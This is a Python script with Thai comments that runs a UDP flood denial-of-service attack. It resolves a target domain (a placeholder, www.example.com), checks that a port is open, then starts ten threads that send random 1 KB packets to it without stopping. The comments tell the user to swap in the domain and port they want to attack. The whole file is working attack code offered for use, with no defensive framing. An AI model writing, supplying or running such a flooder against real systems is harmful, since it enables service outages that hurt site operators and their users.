import socket
import random
import threading


# ฟังก์ชันสำหรับการส่ง UDP Flood
def udp_flood(target_domain, target_port):
    try:
        # แปลงชื่อโดเมนเป็น IP Address
        target_ip = socket.gethostbyname(target_domain)
    except socket.gaierror as e:
        print(f"Error resolving domain {target_domain}: {e}")
        return

    # สร้าง socket UDP
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # ข้อมูลที่ส่ง (ข้อมูลสุ่ม)
    data = random._urandom(1024)  # ขนาดข้อมูล 1024 ไบต์

    while True:
        try:
            # ส่งข้อมูลไปยัง IP และพอร์ตที่ระบุ
            client.sendto(data, (target_ip, target_port))
            print(f"Sent packet to {target_ip}:{target_port}")
        except Exception as e:
            print(f"Error: {e}")
            break


# ฟังก์ชันเพื่อตรวจสอบว่าเซิร์ฟเวอร์เปิดพอร์ตหรือไม่
def check_port(target_domain, target_port):
    try:
        sock = socket.create_connection((target_domain, target_port), timeout=5)
        print(f"Port {target_port} is open on {target_domain}")
        sock.close()
        return True
    except socket.error:
        print(f"Port {target_port} is closed on {target_domain}")
        return False


# ตั้งค่าตัวแปร
target_domain = "www.example.com"  # เปลี่ยนเป็นชื่อโดเมนของเป้าหมาย
target_port = 443  # เปลี่ยนเป็นพอร์ตที่ต้องการโจมตี (เช่น 80 สำหรับ HTTP)

# ตรวจสอบว่าเซิร์ฟเวอร์เปิดพอร์ตหรือไม่
if check_port(target_domain, target_port):
    # สร้างเธรดหลายตัวเพื่อส่งแพ็กเก็ตพร้อมกัน
    threads = []
    for i in range(10):  # จำนวนเธรดที่ต้องการ
        t = threading.Thread(target=udp_flood, args=(target_domain, target_port))
        t.start()
        threads.append(t)

    # รอให้เธรดทั้งหมดทำงาน
    for t in threads:
        t.join()
else:
    print(f"Cannot start UDP Flood because port {target_port} is closed.")
